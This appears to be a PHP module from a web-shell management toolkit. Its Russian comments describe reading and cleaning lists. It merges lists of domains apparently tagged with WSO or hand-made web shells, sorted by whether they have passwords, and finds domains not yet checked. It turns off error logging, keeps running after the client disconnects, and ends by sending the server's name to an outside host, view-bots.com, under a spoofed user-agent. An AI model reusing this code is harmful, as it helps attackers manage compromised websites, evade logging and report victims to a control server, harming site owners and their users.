<?php
ignore_user_abort(true);
set_time_limit(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
function read_file($file_name) 	// $file_name - имя текст дока, который надо прочитать. $arr_name - имя массива, в который надо сохранить.
{
	$list = dirname(__FILE__)."/"."$file_name";
	if (file_exists("$file_name") and (filesize("$file_name")>1))
	{
		$file = fopen($list,"rt");
		$arr_file = explode("\n",fread($file,filesize($list)));
		fclose($file);
		return $arr_file;
	}
	else
	{
		$arr_file = array();
		return $arr_file;
	}
}

function arr_trim($arr)			// Очищает элементы массива от лишних пробелов.
{	
	$new_array = array();
	foreach ($arr as $each)
	{
		$new_array[] = trim($each);
	}
	return $new_array;
}
?>


<?php
if ($_GET['step'] == 'first')
{
	$check = 'rvf';

	$a_g_r_1 = read_file('good_list_1.txt'); 
	$a_g_r_2 = read_file('good_list_2.txt'); 
	$a_g_r_3 = read_file('good_list_3.txt'); 
	$a_g_r_4 = read_file('good_list_4.txt'); 
	$a_g_r_5 = read_file('good_list_5.txt'); 
	$a_g_r_6 = read_file('good_list_6.txt'); 
	$a_g_r_7 = read_file('good_list_7.txt'); 
	$a_g_r_8 = read_file('good_list_8.txt'); 
	$a_g_r_9 = read_file('good_list_9.txt'); 
	$a_g_r_10 = read_file('good_list_10.txt'); 
	$a_g_r_11 = read_file('good_list_11.txt'); 
	$a_g_r_12 = read_file('good_list_12.txt'); 
	$a_g_r_13 = read_file('good_list_13.txt'); 
	$a_g_r_14 = read_file('good_list_14.txt'); 
	$a_g_r_15 = read_file('good_list_15.txt'); 
	$a_g_r_16 = read_file('good_list_16.txt'); 
	$a_g_r_17 = read_file('good_list_17.txt'); 
	$a_g_r_18 = read_file('good_list_18.txt'); 
	$a_g_r_19 = read_file('good_list_19.txt'); 
	$a_g_r_20 = read_file('good_list_20.txt'); 

	$a_b_r_1 = read_file('bad_list_1.txt'); 
	$a_b_r_2 = read_file('bad_list_2.txt'); 
	$a_b_r_3 = read_file('bad_list_3.txt'); 
	$a_b_r_4 = read_file('bad_list_4.txt'); 
	$a_b_r_5 = read_file('bad_list_5.txt'); 
	$a_b_r_6 = read_file('bad_list_6.txt'); 
	$a_b_r_7 = read_file('bad_list_7.txt'); 
	$a_b_r_8 = read_file('bad_list_8.txt'); 
	$a_b_r_9 = read_file('bad_list_9.txt'); 
	$a_b_r_10 = read_file('bad_list_10.txt'); 
	$a_b_r_11 = read_file('bad_list_11.txt'); 
	$a_b_r_12 = read_file('bad_list_12.txt'); 
	$a_b_r_13 = read_file('bad_list_13.txt'); 
	$a_b_r_14 = read_file('bad_list_14.txt'); 
	$a_b_r_15 = read_file('bad_list_15.txt'); 
	$a_b_r_16 = read_file('bad_list_16.txt'); 
	$a_b_r_17 = read_file('bad_list_17.txt'); 
	$a_b_r_18 = read_file('bad_list_18.txt'); 
	$a_b_r_19 = read_file('bad_list_19.txt'); 
	$a_b_r_20 = read_file('bad_list_20.txt'); 

	$a_nl_r_1 = read_file('not_loading_1.txt'); 
	$a_nl_r_2 = read_file('not_loading_2.txt'); 
	$a_nl_r_3 = read_file('not_loading_3.txt'); 
	$a_nl_r_4 = read_file('not_loading_4.txt'); 
	$a_nl_r_5 = read_file('not_loading_5.txt'); 
	$a_nl_r_6 = read_file('not_loading_6.txt'); 
	$a_nl_r_7 = read_file('not_loading_7.txt'); 
	$a_nl_r_8 = read_file('not_loading_8.txt'); 
	$a_nl_r_9 = read_file('not_loading_9.txt'); 
	$a_nl_r_10 = read_file('not_loading_10.txt'); 
	$a_nl_r_11 = read_file('not_loading_11.txt'); 
	$a_nl_r_12 = read_file('not_loading_12.txt'); 
	$a_nl_r_13 = read_file('not_loading_13.txt'); 
	$a_nl_r_14 = read_file('not_loading_14.txt'); 
	$a_nl_r_15 = read_file('not_loading_15.txt'); 
	$a_nl_r_16 = read_file('not_loading_16.txt'); 
	$a_nl_r_17 = read_file('not_loading_17.txt'); 
	$a_nl_r_18 = read_file('not_loading_18.txt'); 
	$a_nl_r_19 = read_file('not_loading_19.txt'); 
	$a_nl_r_20 = read_file('not_loading_20.txt'); 

	$total_good = array_merge($a_g_r_1, $a_g_r_2, $a_g_r_3, $a_g_r_4, $a_g_r_5, $a_g_r_6, $a_g_r_7, $a_g_r_8, $a_g_r_9, $a_g_r_10, $a_g_r_11, $a_g_r_12, $a_g_r_13, $a_g_r_14, $a_g_r_15, $a_g_r_16, $a_g_r_17, $a_g_r_18, $a_g_r_19, $a_g_r_20);
	$total_bad = array_merge($a_b_r_1, $a_b_r_2, $a_b_r_3, $a_b_r_4, $a_b_r_5, $a_b_r_6, $a_b_r_7, $a_b_r_8, $a_b_r_9, $a_b_r_10, $a_b_r_11, $a_b_r_12, $a_b_r_13, $a_b_r_14, $a_b_r_15, $a_b_r_16, $a_b_r_17, $a_b_r_18, $a_b_r_19, $a_b_r_20);
	$total_nl = array_merge($a_nl_r_1, $a_nl_r_2, $a_nl_r_3, $a_nl_r_4, $a_nl_r_5, $a_nl_r_6, $a_nl_r_7, $a_nl_r_8, $a_nl_r_9, $a_nl_r_10, $a_nl_r_11, $a_nl_r_12, $a_nl_r_13, $a_nl_r_14, $a_nl_r_15, $a_nl_r_16, $a_nl_r_17, $a_nl_r_18, $a_nl_r_19, $a_nl_r_20);

	$total_good = array_unique($total_good);
	$total_bad = array_unique($total_bad);
	$total_nl = array_unique($total_nl);

	$links_for_check = read_file('domains.txt');
	$links_for_check = arr_trim($links_for_check);
	
	$g = fopen ("good_list.txt", "w");
	fwrite($g, $check."\n");
	foreach ($total_good as $each_good)
	{
		if (($each_good != '') and ($each_good != ' ') and ($each_good != null) and ($each_good != 'rvf') and ($each_good != "\0"))
		{
			$each_good = trim($each_good);
			$each_check = stristr($each_good, ' ');
			if (($each_check == ' - WSO') or ($each_check == ' - without_pass_wso') or ($each_check == ' - without_pass_handmade') or ($each_check == ' - with pass unknown') or ($each_check == ' - without pass unknown') or ($each_check == ' - interest'))
			{
				$pos_end = strpos($each_good, ' ');
				$each_res_for_check = substr_replace($each_good, '', $pos_end, 99999);
				
				if (in_array($each_res_for_check, $links_for_check)) 
					fwrite($g, $each_good."\n");
			}
		}
	}
	fclose($g);
	
	$b = fopen ("bad_list.txt", "w");
	fwrite($b, $check."\n");
	foreach ($total_bad as $each_bad)
	{
		if (($each_bad != '') and ($each_bad != ' ') and ($each_bad != null) and ($each_bad != 'rvf') and ($each_bad != "\0"))
			fwrite($b, $each_bad."\n");
	}
	fclose($b);

	$nl = fopen ("not_loading.txt", "w");
	fwrite($nl, $check."\n");
	foreach ($total_nl as $each_nl)
	{
		if (($each_nl != '') and ($each_nl != ' ') and ($each_nl != null) and ($each_nl != 'rvf') and ($each_nl != "\0"))
			fwrite($nl, $each_nl."\n");
	}
	fclose($nl);
	
	
	if (file_exists("bad_list.txt") and (filesize("bad_list.txt")>0))
		$bad = read_file("bad_list.txt");
	else
		$bad = array('');

	if (file_exists("good_list.txt") and (filesize("good_list.txt")>0))
		$good = read_file("good_list.txt");
	else
		$good = array('');
		
	if (file_exists("not_loading.txt") and (filesize("not_loading.txt")>0))
		$not_loading = read_file("not_loading.txt");
	else
		$not_loading = array('');	

	$result = array_merge($bad, $good, $not_loading);
	$new_result = array();
	
	foreach ($result as $clean_result)
	{
		if (($clean_result != '') and ($clean_result != ' ') and ($clean_result != null) and ($clean_result != 'rvf'))
		{
			$clean_result = str_replace(' - wso', '', $clean_result);
			$clean_result = str_replace(' - WSO', '', $clean_result);
			$clean_result = str_replace(' - without_pass_wso', '', $clean_result);
			$clean_result = str_replace(' - without_pass_handmade', '', $clean_result);
			$clean_result = str_replace(' - without pass unknown', '', $clean_result);
			$clean_result = str_replace(' - interest', '', $clean_result);
			
			$clean_result = trim($clean_result);
			$new_result[] = $clean_result;
		}
	}
	
	$f = fopen ("all_result.txt", "w");
	fwrite($f, $check."\n");
	
	$new_result = array_unique($new_result);
	foreach ($new_result as $each)
	{
		$each = trim($each);
		if (($each != '') and ($each != ' ') and ($each != null) and ($each != 'rvf'))
			fwrite($f, $each."\n");
	}
	fclose($f);
	
	// START: Ищем not_checked домены
	$all_result = read_file('all_result.txt');
	$domains = arr_trim(read_file('domains.txt'));

	$finish_result = array_diff($domains, $all_result);				// Исключаем общие домены
	sort($finish_result);



	// END: Ищем not_checked домены
	$check = 'rvf';

	$sd = fopen ("not_checked.txt", "w");
	fwrite($sd, $check."\n");
	
	$finish_result = array_unique($finish_result);
	foreach ($finish_result as $not_check)
	{
		if (($not_check != '') and ($not_check != ' ') and ($not_check != null) and ($not_check != 'rvf'))
			fwrite($sd, $not_check."\n");
	}
	fclose($sd);

	echo "Cleaning is done!";
	
	$domain_name = $_SERVER['SERVER_NAME'];
	$url = 'http://view-bots.com/reciever.php?clean='.$domain_name;
	$UA = 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)';
	
	$ch = curl_init($url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);		
	curl_setopt($ch, CURLOPT_TIMEOUT, 9);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); 
	curl_setopt($ch, CURLOPT_REFERER, $domain_name);
	curl_setopt($ch, CURLOPT_USERAGENT, $UA);
	
	$data = curl_exec($ch);
	curl_close($ch);
	
	echo $data.'<hr>';
	
	$data = file_get_contents($url);
	echo $data.'<hr>';
}
?>